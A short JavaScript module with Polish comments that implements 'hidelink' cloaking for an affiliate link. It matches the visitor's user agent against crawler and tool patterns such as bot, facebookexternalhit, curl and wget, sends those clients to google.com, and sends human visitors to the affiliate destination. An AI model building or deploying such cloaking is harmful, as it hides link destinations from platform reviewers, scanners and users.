// Skrypt do natychmiastowego przekierowania na wejściu (hidelink)
import { AFFILIATE_LINK } from "./config";

const botUserAgents = [
  /bot/i,
  /crawl/i,
  /spider/i,
  /slurp/i,
  /facebookexternalhit/i,
  /facebot/i,
  /ia_archiver/i,
  /python/i,
  /curl/i,
  /wget/i,
  /node/i,
  /axios/i,
  /go-http-client/i,
  /libwww/i,
  /httpclient/i
];

const BOT_REDIRECT = "https://google.com";

export function hidelinkRedirect() {
  try {
    const ua = navigator.userAgent;
    const isBot = botUserAgents.some((re) => re.test(ua));
    if (isBot) {
      window.location.replace(BOT_REDIRECT);
    } else {
      window.location.replace(AFFILIATE_LINK);
    }
  } catch (e) {
    // fallback: nie przekierowuj
  }
}
